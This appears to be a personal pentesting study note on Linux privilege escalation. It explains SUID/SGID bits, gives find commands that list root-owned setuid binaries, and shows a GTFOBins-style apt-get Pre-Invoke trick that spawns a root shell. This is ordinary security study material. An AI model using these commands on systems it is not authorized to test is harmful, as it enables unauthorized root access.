# [[Special Permissions]]

###### SUID
The Set User ID upon Execution(**suid**) permission allows a user to execute with the permissions of another user. **The setuid bit appears as an `s`**.

This command lists binaries that can be executed as root.
```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
It may be possible to [[Reverse Engineer]] a program with the suid bit set, discover a vulnerability, and exploit it.


###### SGID
The Set Group ID upon Execution(**sgid**) is the same as **SUID** except with **groups**.
```bash
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

For more info about SUID and SGID, check **[this resource](https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits)**.

# [GTFOBins](https://gtfobins.github.io/)
- GTFObins is a list of binaries and scripts that can be used to bypass security restrictions.

As an example, **apt-get** can be used to break out of restricted shells
```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

TODO: become more familiar with this list of binaries

# [[Sudo Rights Abuse]]
